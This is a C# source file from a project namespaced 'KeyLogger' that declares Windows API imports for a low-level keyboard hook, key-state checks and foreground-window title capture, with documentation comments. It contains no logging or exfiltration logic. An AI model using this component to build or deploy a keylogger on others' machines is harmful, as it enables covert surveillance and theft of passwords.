using System;
using System.Runtime.InteropServices;
using System.Text;

namespace KeyLogger
{
    /// <summary>
    /// Class to wrap the dependencies for the User32.dll and Kernel32.dll
    /// </summary>
    internal static class Win32
    {
        /// <summary>
        ///     Installs an application-defined hook procedure into a hook chain.
        ///     You would install a hook procedure to monitor the system for
        ///     certain types of events. These events are associated either with
        ///     a specific thread or with all threads in the same desktop as
        ///     the calling thread.
        /// </summary>
        /// <seealso cref="https://msdn.microsoft.com/en-us/library/windows/desktop/ms644990(v=vs.85).aspx"/>
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        /// <summary>
        ///     Removes a hook procedure installed in a hook chain by the
        ///     SetWindowsHookEx function.
        /// </summary>
        /// <param name="hhk">C++ ( hhk [in]. Type: HHOOK )<para/>
        ///     A handle to the hook to be removed. This parameter is a hook
        ///     handle obtained by a previous call to <see cref="SetWindowsHookEx" />.
        /// </param>
        /// <seealso cref="https://msdn.microsoft.com/en-us/library/windows/desktop/ms644993(v=vs.85).aspx"/>
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool UnhookWindowsHookEx(IntPtr hhk);

        /// <summary>
        ///     Passes the hook information to the next hook procedure in the
        ///     current hook chain. A hook procedure can call this function
        ///     either before or after processing the hook information.
        /// </summary>
        /// <param name="hhk">
        ///     C++ ( hhk [in, optional]. Type: HHOOK )<para />
        ///     This parameter is ignored.
        /// </param>
        /// <param name="nCode">
        ///     C++ ( nCode [in]. Type: int )<para />
        ///     The hook code passed to the current hook procedure. The next
        ///     hook procedure uses this code to determine how to process the
        ///     hook information.
        /// </param>
        /// <param name="wParam">
        ///     C++ ( wParam [in]. Type: WPARAM )<para />
        ///     The wParam value passed to the current hook procedure. The
        ///     meaning of this parameter depends on the type of hook associated
        ///     with the current hook chain.
        /// </param>
        /// <param name="lParam">
        ///     C++ ( lParam [in]. Type: LPARAM )<para />
        ///     The lParam value passed to the current hook procedure. The
        ///     meaning of this parameter depends on the type of hook associated
        ///     with the current hook chain.
        /// </param>
        /// <returns>
        ///     C++ ( Type: LRESULT )<para />
        ///     This value is returned by the next hook procedure in the chain.
        ///     The current hook procedure must also return this value. The
        ///     meaning of the return value depends on the hook type. For more
        ///     information, see the descriptions of the individual hook procedures.
        /// </returns>
        /// <remarks>
        ///     Hook procedures are installed in chains for particular hook types.
        ///     <see cref="CallNextHookEx" /> calls the next hook in the chain.
        ///     <para/>
        ///     Calling CallNextHookEx is optional, but it is highly recommended;
        ///     otherwise, other applications that have installed hooks will not
        ///     receive hook notifications and may behave incorrectly as a result.
        ///     You should call <see cref="CallNextHookEx" /> unless you
        ///     absolutely need to prevent the notification from being seen by
        ///     other applications.
        /// </remarks>
        /// <seealso cref="https://msdn.microsoft.com/en-us/library/windows/desktop/ms644974(v=vs.85).aspx"/>
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        /// <summary>
        /// Retrieves a module handle for the specified module. The module
        /// must have been loaded by the calling process.
        /// </summary>
        /// <remarks>
        /// To avoid the race conditions described in the Remarks
        /// section, use the GetModuleHandleEx function.
        /// </remarks>
        /// <seealso cref="https://msdn.microsoft.com/en-us/library/windows/desktop/ms683199(v=vs.85).aspx"/>
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern IntPtr GetModuleHandle(string lpModuleName);

        /// <summary>
        /// Retrieves the status of the specified virtual key. The status
        /// specifies whether the key is up, down, or toggled (on,
        /// off—alternating each time the key is pressed).
        /// </summary>
        /// <seealso cref="https://msdn.microsoft.com/en-us/library/windows/desktop/ms646301(v=vs.85).aspx"/>
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        internal static extern short GetKeyState(KeyCode virtualKeyCode);

        /// <summary>
        ///     Determines whether a key is up or down at the time the function
        ///     is called, and whether the key was pressed after a previous
        ///     call to GetAsyncKeyState.
        /// </summary>
        /// <seealso cref="https://msdn.microsoft.com/en-us/library/windows/desktop/ms646293(v=vs.85).aspx"/>
        [DllImport("User32.dll")]
        internal static extern short GetAsyncKeyState(KeyCode vKey);

        /// <summary>
        /// Copies the text of the specified window's title bar (if it has one)
        /// into a buffer. If the specified window is a control, the text of
        /// the control is copied. However, GetWindowText cannot retrieve
        /// the text of a control in another application.
        /// </summary>
        /// <seealso cref="https://msdn.microsoft.com/en-us/library/windows/desktop/ms633520(v=vs.85).aspx"/>
        [DllImport("User32.dll")]
        internal static extern int GetWindowText(IntPtr hwnd, StringBuilder s, int nMaxCount);

        /// <summary>
        /// Returns a handle to the window the user is working with.
        /// </summary>
        [DllImport("User32.dll")]
        internal static extern IntPtr GetForegroundWindow();

        /// <summary>
        /// Returns the ID of the thread that created the target window
        /// </summary>
        /// <seealso cref="https://msdn.microsoft.com/en-us/library/windows/desktop/ms633522(v=vs.85).aspx"/>
        [DllImport("user32.dll")]
        internal static extern uint GetWindowThreadProcessId(IntPtr hwnd, IntPtr proccess);

        /// <summary>
        /// Retrieves the active input locale identifier (formerly called the keyboard layout).
        /// </summary>
        /// <seealso cref="https://msdn.microsoft.com/en-us/library/windows/desktop/ms646296(v=vs.85).aspx"/>
        [DllImport("user32.dll")]
        internal static extern IntPtr GetKeyboardLayout(uint thread);

        internal delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    }
}

